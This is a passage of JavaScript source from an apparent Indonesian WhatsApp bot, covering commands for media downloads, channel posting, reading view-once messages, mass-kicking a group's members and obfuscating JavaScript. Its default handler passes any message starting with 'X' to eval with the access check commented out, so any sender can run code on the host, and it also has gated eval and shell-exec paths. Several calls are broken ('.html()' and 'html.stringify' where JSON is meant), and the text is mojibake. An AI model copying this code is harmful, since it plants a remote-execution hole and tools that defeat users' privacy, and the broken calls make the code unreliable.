				video: { url: cejd.video_1 },
				caption: `*Title* : ${cejd.title}
*Category* : ${cejd.category}
*Mimetype* : ${cejd.type}
*Views* : ${cejd.views_count}
*Shares* : ${cejd.share_count}
*Source* : ${cejd.link}
*Media Url* : ${cejd.video_1}`
			}, { quoted: x })
		}

		break;

case 'pinvid': case 'pinterestvideo': case 'pinvideo': {
    if (!text) return reply('Masukkan kata kunci untuk mencari video di Pinterest!');
    async function PinterestVid(teks) {
        const url = `https://id.pinterest.com/resource/BaseSearchResource/get/?_=1619980301559&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(teks)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(teks)}`;
        try {
            const response = await axios.get(url);
            const data = response.data;
            if (!data || !data.resource_response || !data.resource_response.data || !data.resource_response.data.results) {
                return []; 
            }
            const results = data.resource_response.data.results;
            const videoUrls = results
                .filter(pin => pin.story_pin_data) 
                .flatMap(pin => {
                    const pages = pin.story_pin_data.pages;
                    if (pages && pages.length > 0) {
                        const blocks = pages[0].blocks;
                        if (blocks && blocks.length > 0) {
                            const videoList = blocks[0].video && blocks[0].video.video_list;
                            if (videoList) {
                                return Object.values(videoList)
                                    .map(video => video.url)
                                    .filter(url => url); 
                            }
                        }
                    }
                    return [];
                });
            return videoUrls;
        } catch (error) {
            return { error: error.message };
        }
    }

    const result = await PinterestVid(text);
    if (result.error) {
        reply(`Terjadi kesalahan: ${result.error}`);
    } else if (result.length === 0) {
        reply('Tidak ditemukan');
    } else {
        reply(`search results :\n\n${result.join('\n')}`);
    }}
    break;

case 'upch2': {
    if (!text && !quoted) return reply(`text atau media yg mau di up`)
    let messageOptions = {}
    let captionText = text ? text : ""
    let mediaType = ""
    let mediaUrl = ""
    if (quoted) { 
        let mimeType = quoted.mtype || m.mtype
        if (/image/.test(mimeType)) {
            mediaType = "image"
        } else if (/video/.test(mimeType)) {
            mediaType = "video"
        } else if (/audio/.test(mimeType)) {
            mediaType = "audio"
        }
        if (mediaType) {
            let media = await justinn.downloadAndSaveMediaMessage(quoted)
            mediaUrl = media
        } else {
            return reply(`media type is not supported`)
        }
    }
    if (mediaType === "audio") {
        messageOptions.audio = { url: mediaUrl }
        messageOptions.mimetype = "audio/mp4"
        messageOptions.ptt = true
    } else if (mediaType) {
        messageOptions[mediaType] = { url: mediaUrl }
        if (captionText) messageOptions.caption = captionText
    } else {
        messageOptions.text = captionText;
    }
    messageOptions.contextInfo = {
        isForwarded: true,
        serverMessageId: -1,
        forwardingScore: 256,
        externalAdReply: {
            showAdAttribution: true,
            title: "Justin Official V20",
            body: `BÃ­t.ly/JustinOfficial`,
            thumbnailUrl: 'https://files.catbox.moe/1no8wl.jpg',
            sourceUrl: "www.tiktok.com/@justinandiar",
            mediaType: 1,
            renderLargerThumbnail: false,
        },
    }
    await justinn.sendMsg("120363373003239606@newsletter", messageOptions)
    await reply(`successfully sent to channel`)
}
break;
case 'idch': case 'cekidch': {
if (!text) return reply("linkchnya mana")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await justinn.newsletterMetadata("invite", result)
let tekx = `*ID* : ${res.id}
*Nama :* *${res.name}*
*Total Pengikut :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: tekx }, 
footer: {
text: "Developer JustinOfficial" }, 
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamshtml": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await justinn.relayMsg( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break;
case 'tourl': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if ((/image|video|audio/.test(mimetype)) && !/webp/.test(mimetype)) {
        justinn.sendMsg(m.chat, {
            react: {
                text: 'â³',
                key: m.key,
            }
        });

        try {
            const media = await q.download?.();
            const fileSizeInBytes = media.length;
            const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
            const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
            const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            let ext = '';
            if (mimetype.includes('video')) ext = '.mp4';
            else if (mimetype.includes('jpeg')) ext = '.jpg';
            else if (mimetype.includes('png')) ext = '.png';
            else if (mimetype.includes('gif')) ext = '.gif';
            else if (mimetype.includes('audio')) ext = '.mp3';
            else ext = '';
            form.append('fileToUpload', media, `file${ext}`);
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            const url = result.trim();
            const caption = `\nðŸ”— URL: ${url}\n*Ukuran:* ${fileSize}`;
            let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: caption }, 
footer: {
text: "Developer JustinOfficial" }, 
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamshtml": `{"display_text": "copy Url","copy_code": "${url}"}`
           },
     ], },},
    }, }, },{ quoted : catalems });
await justinn.relayMsg( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);

        } catch (e) {
            console.error(e);
            reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
        }
    } else {
        reply(`reply .${command}`);
    }
};
break
case 'ytplay':
case 'play': {
  if (!text) {
    return m.reply(`Example: ${prefix} wildflower`)
  }
  try {
    justinn.sendMsg(m.chat, { react: { text: `â±ï¸`, key: m.key }})
    const yts = require('yt-search')
const nyoba = await yts(text);
const { url, title, description, thumbnail, duration, ago, views, author } = nyoba.all[0];
    const body = `*Judul:* ${title}\n` +
      `*Channel:* ${author.name}\n` +
      `*Durasi:* ${duration}\n` +
      `*Link:* ${url}\n\nKlik *Video* tuk vidio\nKlik *Audio* tuk audio`
    const buttons = [
      {
        buttonId: `${prefix}ytmp4 ${url}`,
        buttonText: { displayText: 'Video' },
        type: 1
      },
      {
        buttonId: `${prefix}ytmp3 ${url}`,
        buttonText: { displayText: 'Audio' },
        type: 1
      }
    ]
    await justinn.sendMsg(m.chat, {
      image: { url: thumbnail },
      caption: body,
      footer: null,
      buttons: buttons,
      headerType: 1,
      viewOnce: true
    }, { quoted: catalems })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan: '+err)
  }
}
break
        
case 'ytmp3': {
 if (!text) return m.reply(`masukkan link youtube nya, Contoh: ${prefix + command} https://youtube.com/watch?xxx`);
 const url = text.trim();
 const format = 'mp3';
 const regex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
 if (!regex.test(url)) {
 return m.reply('link yang anda berikan tidak valid, silahkan masuk kan link yang benar.');
 }
 reply('Tunggu sebentar...');
 try {
 const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.html();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.html();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.html();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await justinn.sendMsg(m.chat, {
            audio: { url: result.url },
            mimetype: 'audio/mp4'
        }, { quoted: m });
} catch {
  reply('aduh kak error nieh..')
}
}
break
case 'ytmp4': {
 if (!text) return m.reply(`masukkan link youtube nya, Contoh: ${prefix + command} https://youtube.com/watch?xxx`);
try {
 const url = text.trim();
const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.html();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.html();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.html();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await justinn.sendMsg(m.chat, { video: { url: result.url } }, { quoted: m });
} catch {
  reply('aduh kak error nieh..')
}
}
break
case "tt":
      case "tiktok":
        {
          if (!text) return reply("link tiktok nya mana");
          if (!text.startsWith("https://")) return m.reply("url tiktok nya mana");
          await tiktokDl(q)
            .then(async (result) => {
              await justinn.sendMsg(m.chat, {
                react: { text: "â³", key: m.key },
              });
              if (!result.status) return m.reply("Error!");
              if (result.durations == 0 && result.duration == "0 Seconds") {
                let araara = new Array();
                let urutan = 0;
                for (let a of result.data) {
                  let imgsc = await prepareWAMessageMedia(
                    { image: { url: `${a.url}` } },
                    { upload: justinn.waUploadToServer }
                  );
                  await araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `Foto Slide Ke *${(urutan += 1)}*`,
                      hasMediaAttachment: true,
                      ...imgsc,
                    }),
                    nativeFlowMessage:
                      proto.Message.InteractiveMessage.NativeFlowMessage.fromObject(
                        {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamshtml: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`,
                            },
                          ],
                        }
                      ),
                  });
                }
                const msgii = await generateWAMessageFromContent(
                  m.chat,
                  {
                    viewOnceMessageV2Extension: {
                      message: {
                        messageContextInfo: {
                          deviceListMetadata: {},
                          deviceListMetadataVersion: 2,
                        },
                        interactiveMessage:
                          proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject(
                              {
                                text: "*Tiktok Downloader âœ…*",
                              }
                            ),
                            carouselMessage:
                              proto.Message.InteractiveMessage.CarouselMessage.fromObject(
                                {
                                  cards: araara,
                                }
                              ),
                          }),
                      },
                    },
                  },
                  { userJid: m.sender, quoted: m }
                );
                await justinn.relayMsg(m.chat, msgii.message, {
                  messageId: msgii.key.id,
                });
              } else {
                let urlVid = await result.data.find(
                  (e) => e.type == "nowatermark_hd" || e.type == "nowatermark"
                );
                await justinn.sendMsg(
                  m.chat,
                  {
                    video: { url: urlVid.url },
                    mimetype: "video/mp4",
                    caption: `*Tiktok Downloader âœ…*`,
                  },
                  { quoted: m }
                );
              }
            })
            .catch((e) => console.log(e));
          await justinn.sendMsg(m.chat, { react: { text: "", key: m.key } });
        }
        break;
  case "tiktokmp3":
      case "ttmp3":
        {
          if (!text) return reply("linknya mana");
          if (!text.startsWith("https://"))
            return reply("Link tautan tidak valid");
          await justinn.sendMsg(m.chat, {
            react: { text: "â³", key: m.key },
          });
          await tiktokDl(text)
            .then(async (res) => {
              if (!res.status) return m.reply("Error! Result Not Found");
              await justinn.sendMsg(
                m.chat,
                { audio: { url: res.music_info.url }, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              await justinn.sendMsg(m.chat, {
                react: { text: "", key: m.key },
              });
            })
            .catch((e) => m.reply("Error! Result Not Found"));
        }
        break;
case "rvo": case "readviewonce": case "â€¢": {
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return justinn.sendMsg(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return justinn.sendMsg(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return justinn.sendMsg(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "kudeta": {
 if (!isGroup) return reply("Khusus Dalam Grup")
    if (!Access) return reply(mess.ketua)
    let memberFilter = await groupMembers.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
    if (memberFilter.length < 1) return reply("Group Ini Tidak Ada Member . . .")
    await reply("Bye Bye Deck!ðŸ¤­")
    for (let i of memberFilter) {
    await justinn.groupParticipantsUpdate(m.chat, [i], 'remove')
    await sleep(1000)
    }
    await reply("Kudeta Group By JustinOffc")
    }
    break
        
case 'plays': case 'playspotify': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: plays Jakarta Hari Ini');
  const res = await fetch(`https://api.nekorinn.my.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
  if (!res.ok) return m.reply('Gagal mengambil data lagu.');
  const data = await res.html();
  if (!data.status) return m.reply('Lagu tidak ditemukan!');
  const { title, artist, duration, imageUrl, link } = data.result.metadata;
  const downloadUrl = data.result.downloadUrl;
  await justinn.sendMsg(m.chat, {
    audio: { url: downloadUrl },
    mimetype: 'audio/mpeg',
    fileName: `${title}.mp3`,
    ptt: true, // true kalau mau dikirim sebagai VN
    contextInfo: {
      externalAdReply: {
        title: title,
        body: `${artist} â€¢ ${duration}`,
        mediaType: 2,
        thumbnailUrl: imageUrl,
        renderLargerThumbnail: true,
        sourceUrl: link, 
        showAdAttribution: true
      }
    }
  }, { quoted: m });
}
break
case 'getsw': case "sw": {
    if (m.isGroup) return reply("Khusus Private Chat");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return reply("komen sw yang ingin di ambil");

    if (quotedMessage.imageMessage) {
        let imageUrl = await justinn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return justinn.sendMsg(m.chat, { image: { url: imageUrl } }, { quoted: catalems });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await justinn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return justinn.sendMsg(m.chat, { video: { url: videoUrl } }, { quoted: catalems });
    }

    return reply("apasi jir");
}
break
case 'hd':{
     if (!text && Access[m.sender]) return reply(mess.owner);
        const FormData = require('form-data');
        const { fromBuffer } = require('file-type');
        if(m.mtype!='imageMessage')return m.reply('mohon kirim gambarnya');
        m.reply('tunggu sedang di proses');
        const fileBuffer = await m.download();
        const fileType = await fromBuffer(fileBuffer);
        if (!fileType || (!fileType.mime.startsWith('image/') && !fileType.mime.startsWith('video/'))) {
          throw new Error('File harus berformat gambar atau video');
        }
        const fileName = `media_${Date.now()}.${fileType.ext}`;
        const formData = new FormData();
        formData.append('file', fileBuffer, {
          filename: fileName,
          contentType: fileType.mime,
        });
        const response = await axios.post('https://api.ryzendesu.vip/api/uploader/ryzencdn', formData, {
          headers: {
            ...formData.getHeaders(),
            accept: 'application/html',
          },
        });
        let imgurl = response.data.url;
        justinn.sendMsg(m.chat,{image:{url:"https://fastrestapis.fasturl.cloud/aiimage/upscale?resize=8&imageUrl="+encodeURIComponent(imgurl)}},{quoted:m})
			}
			break
case 'enchard': {
    if (!m.quoted) return reply("Reply File.js Nya");
    if (mime !== "application/javascript") return reply("Reply File.js Nya");
    let a = await m.quoted.download(),
        b = m.quoted.fileName;
    await fs.writeFileSync(`./@hardenc${b}.js`, a);
    await reply("Memproses encrypt hard....");

    await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${b}.js`).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const c = "ç´ ã—Šã–¶ã—…JustinOfficialã–¢à¸ˆà¸±à¸ªà¸•à¸´à¸™à¸­à¸¢à¹ˆà¸²à¸‡à¹€à¸›à¹‡à¸™à¸—à¸²à¸‡à¸à¸²à¸£ã–¯ã–°ã—‰æ™´" + "ç´ æ™´åº§ç´ JustinOfficialæ™´à¸ˆà¸±à¸ªà¸•à¸´à¸™à¸­à¸¢à¹ˆà¸²à¸‡à¹€à¸›à¹‡à¸™à¸—à¸²à¸‡à¸à¸²à¸£åº§ç´ æ™´é›£",
                d = x => x.replace(/[^a-zA-Zåº§JustinOfficialç´ à¸ˆà¸±à¸ªà¸•à¸´à¸™à¸­à¸¢à¹ˆà¸²à¸‡à¹€à¸›à¹‡à¸™à¸—à¸²à¸‡à¸à¸²à¸£ç´ æ™´]/g, ''),
                e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
            return d(c) + e(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1,
        shuffle: { hash: 0, true: 0 },
        stack: true,
        controlFlowFlattening: 1,
        opaquePredicates: 0.9,
        deadCode: 0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async f => {
        await fs.writeFileSync(`./@hardenc${b}.js`, f);
        await justinn.sendMsg(
            m.chat,
            { document: fs.readFileSync(`./@hardenc${b}.js`), mimetype: "application/javascript", fileName: b, caption: "Sukses Encrypt File JS! Type: String" },
            { quoted: catalems }
        );
    }).catch(g => m.reply("Error :" + g));
}
break;
default:
if (body.startsWith("~")) {
    if (!Access) return;
    reply('*execute...*')
    function Return(sul) {
        let sat = html.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
			
if (budy.startsWith("X")) {
 // if (!Access) return
    await reaction(m.chat, 'â³')
    try {
        let evaled = await eval(q);
        if (typeof evaled !== "string") evaled = util.inspect(evaled);
        await m.reply(evaled);
    } catch (e) {
        await m.reply(`Error: ${String(e)}`);
    }
}
                
if (budy.startsWith('-')) {
    if (!Access) return
    await reaction(m.chat, 'â³')
    if (text == "rm -rf *") return m.reply("ðŸ˜¹")
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
    })
}
 
}
} catch (err) {
        console.log(require("util").format(err));
    }
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
